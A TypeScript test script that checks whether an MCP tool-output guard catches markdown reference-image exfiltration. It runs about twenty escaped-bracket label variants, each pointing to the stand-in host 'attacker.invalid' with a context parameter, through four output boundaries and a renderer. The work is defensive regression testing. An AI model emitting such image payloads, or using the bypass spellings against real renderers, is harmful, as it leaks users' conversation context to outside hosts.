// T83 — the spellings T82's probe did not carry, at the four public boundaries
// and against the renderer this floor defends against.
//
// `T82-escape.ts` is the reviewer's and is run unmodified elsewhere. This one
// adds the spellings the dispatch names — a label carrying both an escaped and
// an unescaped bracket, and an escaped backslash before a bracket — plus the
// case, whitespace, destination-form and duplicate variants of the escaped
// close, and the two directions a repair could get wrong: a use with an escape
// and a definition without one (must stay released, no false positive), and a
// definition the OLD pattern matched through its escaped `]` (must stay
// flagged, no release).
//
// Read-only, offline, synthetic and reserved hosts only.
// Usage: bun T83-escape.ts
import {
  prepareOutputForPersistence,
  validateOutputForTransport,
  type GuardResult,
} from "../../../../src/security/guard";
import { mergeMcpConfig } from "../../../../src/mcp/config";
import { buildDiscovery } from "../../../../src/mcp/discovery";
import { dispatchCallTool, type McpContext } from "../../../../src/mcp/dispatch";
import { redactToolOutput } from "../../../../src/mcp/redact-seam";
import { detectExfil } from "../../../../src/security/detect/exfil";
import { marked } from "marked";

const ATT = "attacker.invalid";
const U = `https://${ATT}/p?ctx=CTX`;
const OK = "https://ok.example.org/x";

const pass: GuardResult = {
  allowed: true,
  decision: { gate: "pass", action: "allow", findings: [] },
};

const shapes: Record<string, string> = {
  // control
  m00Baseline: `![a]\n\n[a]: ${U}\n`,
  // the dispatch's two named additions
  m01EscapedAndUnescapedBracket: `![a\\]b[c]\n\n[a\\]b[c]: ${U}\n`,
  m02EscapedCloseThenBracketPair: `![a\\][b]\n\n[a\\][b]: ${U}\n`,
  m03EscapedBackslashThenEscapedClose: `![a\\\\\\]]\n\n[a\\\\\\]]: ${U}\n`,
  m04EscapedBackslashBeforeClose: `![a\\\\]\n\n[a\\\\]: ${U}\n`,
  // more of the escaped close
  m05LeadingEscapedClose: `![\\]]\n\n[\\]]: ${U}\n`,
  m06EscapedCloseWhitespaceRun: `![foo\\]  bar]\n\n[foo\\] bar]: ${U}\n`,
  m07EscapedCloseAngleDestination: `![foo\\]]\n\n[foo\\]]: <${U}>\n`,
  m08EscapedCloseNextLineDestination: `![foo\\]]\n\n[foo\\]]:\n  ${U}\n`,
  m09EscapedCloseCaseFolded: `![FOO\\]]\n\n[foo\\]]: ${U}\n`,
  m10EscapedCloseIndentedDefinition: `![foo\\]]\n\n   [foo\\]]: ${U}\n`,
  m11EscapedCloseFullOtherAlt: `![alt][a\\]b]\n\n[a\\]b]: ${U}\n`,
  m12EscapedCloseThreeEscapes: `![a\\]b\\]c\\]d]\n\n[a\\]b\\]c\\]d]: ${U}\n`,
  m13EscapedCloseDuplicate: `![foo\\]]\n\n[foo\\]]: ${U}\n[foo\\]]: ${OK}\n`,
  m14EscapedCloseDuplicateReversed: `![foo\\]]\n\n[foo\\]]: ${OK}\n[foo\\]]: ${U}\n`,
  m15EscapedCloseInsideLink: `[![foo\\]]](https://ci.example.org/job)\n\n[foo\\]]: ${U}\n`,
  m16EscapedCloseCarriageReturnLine: `![foo\\]]\r\r[foo\\]]: ${U}\r`,
  // directions a repair could get wrong
  m17UseEscapedDefinitionPlain: `![foo\\]]\n\n[foo]: ${U}\n`,
  m18UsePlainDefinitionEscaped: `![zzz]\n\n[foo\\]]: ${U}\n`,
  m19OldPatternEscapedTerminator: `![foo\\]\n\n[foo\\]: ${U}\n`,
  m20ReferenceLinkNotImage: `[foo\\]]\n\n[foo\\]]: ${U}\n`,
};

const cwd = process.cwd();
const ctx: McpContext = {
  cwd,
  config: mergeMcpConfig({ redactToolOutput: false }),
  discovery: buildDiscovery({ modules: { mcp: { enabled: true } as never } }),
  transport: "in-process",
  tools: Object.entries(shapes).map(([name, text]) => ({
    name: `p.${name}`,
    module: "standard" as const,
    description: name,
    inputSchema: { type: "object" },
    mutating: false,
    invoke: async () => ({ note: text }),
  })),
};

function rendererImgSrcs(md: string): string[] {
  const html = marked.parse(md, { async: false }) as string;
  return [...html.matchAll(/<img[^>]*\ssrc="([^"]*)"/g)].map((m) => m[1] as string);
}

const rows: Array<Record<string, unknown>> = [];
for (const [name, text] of Object.entries(shapes)) {
  const serialized = JSON.stringify({ note: text });
  const call = await dispatchCallTool(ctx, `p.${name}`, {});
  const persisted = prepareOutputForPersistence(pass, serialized);
  const transported = validateOutputForTransport({ value: { note: text }, format: "json" });
  const seamText = await redactToolOutput(cwd, serialized);
  const imgs = rendererImgSrcs(text);
  const rendererFetchesAttacker = imgs.some((s) => s.includes(ATT));
  const boundaries = {
    mcp: JSON.stringify(call).includes(ATT),
    persist: persisted.allowed ? persisted.content.includes(ATT) : false,
    transport: transported.text.includes(ATT),
    seam: seamText.includes(ATT),
  };
  rows.push({
    id: name,
    rendererFetches: imgs,
    rendererFetchesAttacker,
    detectorFindings: detectExfil(text, []).length,
    mcpState: (call as { redaction?: { state?: string } }).redaction?.state ?? "?",
    boundaries,
    leaksAtAnyBoundary: Object.values(boundaries).some(Boolean),
    verdict:
      rendererFetchesAttacker && Object.values(boundaries).some(Boolean) ? "BYPASS" : "closed",
  });
}

console.log(
  JSON.stringify(
    {
      probe: "T83-escape",
      rows,
      bypasses: rows.filter((r) => r.verdict === "BYPASS").map((r) => r.id),
      // A renderer that fetches with a floor that flags is the pair this floor
      // exists to keep together; both halves are reported so a later round can
      // see which rows are closed because nothing fetches them.
      rendererFetchesButNoFinding: rows
        .filter((r) => r.rendererFetchesAttacker && r.detectorFindings === 0)
        .map((r) => r.id),
      findingWithoutRendererFetch: rows
        .filter((r) => !r.rendererFetchesAttacker && (r.detectorFindings as number) > 0)
        .map((r) => r.id),
    },
    null,
    2,
  ),
);
